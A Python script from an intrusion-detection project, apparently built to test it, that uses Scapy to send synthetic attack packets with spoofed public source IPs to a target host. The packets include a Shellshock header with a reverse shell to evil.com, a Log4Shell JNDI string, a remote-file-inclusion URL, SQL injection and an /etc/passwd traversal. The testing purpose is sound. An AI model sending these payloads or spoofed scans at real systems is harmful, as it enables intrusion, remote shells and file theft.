# --- IDS_project2/simulate_attacks.py ---
"""
ORION Attack Simulation Suite
==============================
Generates realistic synthetic attack traffic so you can validate the IDS
pipeline without needing a real attacker.

Simulation types:
  • SYN Flood        — TCP SYN Scan across many ports → triggers SignatureDetector
  • RFI Attack       — HTTP GET with =http:// payload  → triggers signatures.json
  • UDP Exfiltration — Oversized UDP burst              → triggers SignatureDetector
  • ML Anomaly       — Unusual TTL + payload combo      → triggers AnomalyDetector
  • Brute Force      — Rapid TCP connections on port 22 → triggers signatures + ML
  • Shellshock       — CVE-2014-6271 HTTP header        → triggers signatures.json
  • Log4Shell        — ${jndi:ldap://} exploit string   → triggers signatures.json
  • SQL Injection    — UNION SELECT payload              → triggers signatures.json
  • Directory Trav   — ../../../etc/passwd in URI        → triggers signatures.json
  • Port Sweep       — Probe many ports → triggers behavioral anomaly

Target IP resolution (in priority order):
  1. ORION_TARGET_IP environment variable
  2. Auto-detected LAN IP (gateway route to 8.8.8.8)
  3. Fallback: 127.0.0.1 (requires ORION_CAPTURE_IFACE on Windows)
"""

import os
import time
import random
import socket
import sys
from scapy.all import IP, TCP, UDP, Raw, send, conf as scapy_conf

# Keep Scapy quiet about interface warnings
scapy_conf.verb = 0


# ═════════════════════════════════════════════════════════════════════════════
#  TARGET RESOLUTION
# ═════════════════════════════════════════════════════════════════════════════

def resolve_target_ip() -> str:
    """Return the best available target IP for attack simulation."""
    configured = os.getenv("ORION_TARGET_IP")
    if configured:
        return configured

    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.connect(("8.8.8.8", 80))
            detected = s.getsockname()[0]
            if detected and not detected.startswith("127."):
                return detected
    except OSError:
        pass

    return "127.0.0.1"


TARGET_IP = resolve_target_ip()

# ── Optional: override the sending interface ──────────────────────────────────
SEND_IFACE = os.getenv("ORION_CAPTURE_IFACE")   # same env var the engine uses
SEND_KWARGS = {"iface": SEND_IFACE} if SEND_IFACE else {}


# ═════════════════════════════════════════════════════════════════════════════
#  HELPERS
# ═════════════════════════════════════════════════════════════════════════════

def _send(pkt):
    """Wrapper around scapy send with consistent kwargs."""
    send(pkt, verbose=False, **SEND_KWARGS)


def _rand_src_ip() -> str:
    """Generate a random public source IP to simulate external attacker."""
    # Avoid private ranges so the IDS doesn't whitelist us
    return f"{random.randint(1,223)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"


def _rand_sport() -> int:
    return random.randint(20_000, 65_000)


# ═════════════════════════════════════════════════════════════════════════════
#  ATTACK SIMULATIONS
# ═════════════════════════════════════════════════════════════════════════════

def simulate_syn_flood():
    """SYN Flood — rapid SYN packets across many ports → SYN Scan alert."""
    print(f"[SIM] > SYN Flood / Port Scan on {TARGET_IP}...")
    src = _rand_src_ip()
    ports = random.sample(range(1, 65535), 20)
    for dport in ports:
        pkt = IP(src=src, dst=TARGET_IP) / TCP(sport=_rand_sport(), dport=dport, flags="S")
        _send(pkt)
        time.sleep(0.02)
    print(f"[SIM]   |- SYN Flood complete (20 ports from {src})")


def simulate_rfi_attack():
    """Remote File Inclusion — matches =http:// signature."""
    print(f"[SIM] > RFI Payload injection on {TARGET_IP}...")
    payload = (
        b"GET /vulnerable.php?page=http://evil-attacker.com/shell.php HTTP/1.1\r\n"
        b"Host: victim.com\r\n"
        b"User-Agent: Mozilla/5.0\r\n\r\n"
    )
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP) / TCP(dport=80, flags="PA") / Raw(load=payload)
    _send(pkt)
    print(f"[SIM]   |- RFI signature sent.")


def simulate_exfiltration():
    """Large UDP payload — triggers Large UDP Payload signature."""
    print(f"[SIM] > UDP Exfiltration simulation on {TARGET_IP}...")
    data = b"EXFIL:" + os.urandom(1300)   # > 1024 bytes threshold
    pkt  = IP(src=_rand_src_ip(), dst=TARGET_IP) / UDP(dport=9999) / Raw(load=data)
    _send(pkt)
    print(f"[SIM]   |- Large UDP packet sent ({len(data)} bytes).")


def simulate_ml_anomaly():
    """Unusual TTL + rare payload → should trigger ML anomaly detection."""
    print(f"[SIM] > ML Anomaly traffic (TTL=1, payload=500B) on {TARGET_IP}...")
    payload = b"A" * 500
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP, ttl=1) / TCP(dport=443, flags="PA") / Raw(load=payload)
    _send(pkt)
    print(f"[SIM]   |- ML anomaly packet sent.")


def simulate_brute_force():
    """Rapid SSH connection attempts → SSH Brute Force signature."""
    print(f"[SIM] > SSH Brute Force simulation on {TARGET_IP}:22...")
    src = _rand_src_ip()
    payload = b"Failed password for root from 1.2.3.4 port 22 ssh2\r\n"
    for _ in range(8):
        pkt = IP(src=src, dst=TARGET_IP) / TCP(dport=22, flags="PA") / Raw(load=payload)
        _send(pkt)
        time.sleep(0.05)
    print(f"[SIM]   |- SSH brute force burst sent.")


def simulate_shellshock():
    """CVE-2014-6271 exploit pattern — triggers Shellshock signature."""
    print(f"[SIM] > Shellshock exploit header on {TARGET_IP}...")
    payload = (
        b"GET /cgi-bin/test.cgi HTTP/1.1\r\n"
        b"Host: victim.com\r\n"
        b"User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/evil.com/4444 0>&1\r\n\r\n"
    )
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP) / TCP(dport=80, flags="PA") / Raw(load=payload)
    _send(pkt)
    print(f"[SIM]   |- Shellshock packet sent.")


def simulate_log4shell():
    """CVE-2021-44228 exploit string — triggers Log4Shell signature."""
    print(f"[SIM] > Log4Shell JNDI injection on {TARGET_IP}...")
    payload = (
        b"GET / HTTP/1.1\r\n"
        b"Host: victim.com\r\n"
        b"X-Api-Version: ${jndi:ldap://evil.com/a}\r\n\r\n"
    )
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP) / TCP(dport=8080, flags="PA") / Raw(load=payload)
    _send(pkt)
    print(f"[SIM]   |- Log4Shell packet sent.")


def simulate_sql_injection():
    """Classic SQLi in HTTP GET — triggers SQL Injection signature."""
    print(f"[SIM] > SQL Injection payload on {TARGET_IP}...")
    payloads = [
        b"GET /login?user=admin'%20UNION%20SELECT%201,2,3-- HTTP/1.1\r\nHost: victim.com\r\n\r\n",
        b"GET /search?q=1'%20OR%201=1-- HTTP/1.1\r\nHost: victim.com\r\n\r\n",
    ]
    raw = random.choice(payloads)
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP) / TCP(dport=80, flags="PA") / Raw(load=raw)
    _send(pkt)
    print(f"[SIM]   |- SQL injection packet sent.")


def simulate_directory_traversal():
    """LFI / path traversal — triggers Directory Traversal signature."""
    print(f"[SIM] > Directory Traversal on {TARGET_IP}...")
    payload = b"GET /../../../../etc/passwd HTTP/1.1\r\nHost: victim.com\r\n\r\n"
    pkt = IP(src=_rand_src_ip(), dst=TARGET_IP) / TCP(dport=80, flags="PA") / Raw(load=payload)
    _send(pkt)
    print(f"[SIM]   |- LFI packet sent.")


def simulate_port_sweep():
    """Scan many distinct ports in quick succession → behavioral anomaly."""
    print(f"[SIM] > Port Sweep (behavioral anomaly) on {TARGET_IP}...")
    src = _rand_src_ip()
    for dport in random.sample(range(1, 10000), 15):
        pkt = IP(src=src, dst=TARGET_IP) / TCP(sport=_rand_sport(), dport=dport, flags="S")
        _send(pkt)
        time.sleep(0.01)
    print(f"[SIM]   |- Port sweep complete (15 ports from {src})")


# ═════════════════════════════════════════════════════════════════════════════
#  ATTACK REGISTRY
# ═════════════════════════════════════════════════════════════════════════════

ALL_ATTACKS = [
    simulate_syn_flood,
    simulate_rfi_attack,
    simulate_exfiltration,
    simulate_ml_anomaly,
    simulate_brute_force,
    simulate_shellshock,
    simulate_log4shell,
    simulate_sql_injection,
    simulate_directory_traversal,
    simulate_port_sweep,
]


# ═════════════════════════════════════════════════════════════════════════════
#  MAIN LOOP
# ═════════════════════════════════════════════════════════════════════════════

if __name__ == "__main__":
    print("=" * 60)
    print("       ORION IDS — ATTACK SIMULATION SUITE v2.0")
    print("=" * 60)
    print(f"  Target IP  : {TARGET_IP}")
    print(f"  Interface  : {SEND_IFACE or 'Scapy default'}")
    if TARGET_IP.startswith("127."):
        print()
        print("  [!] Loopback target detected.")
        print("  [!] On Windows, set ORION_CAPTURE_IFACE=\\Device\\NPF_Loopback")
        print("      in your .env so both the engine AND simulator use loopback,")
        print("  [!] OR set ORION_TARGET_IP=<your LAN IP> to use a real adapter.")
    print("=" * 60)
    print("  Available attack types:")
    for i, fn in enumerate(ALL_ATTACKS, 1):
        print(f"    {i:2d}. {fn.__name__.replace('simulate_', '').replace('_', ' ').title()}")
    print("=" * 60)
    print("  Press Ctrl+C to stop simulation.\n")

    try:
        cycle = 0
        while True:
            cycle += 1
            attack_fn = random.choice(ALL_ATTACKS)
            print(f"[SIM] == Cycle {cycle} ==========================================")
            attack_fn()
            wait = random.randint(3, 8)
            print(f"[SIM]   Sleeping {wait}s before next attack...\n")
            time.sleep(wait)

    except KeyboardInterrupt:
        print("\n[SIM] Simulation terminated by user. Goodbye.")
        sys.exit(0)
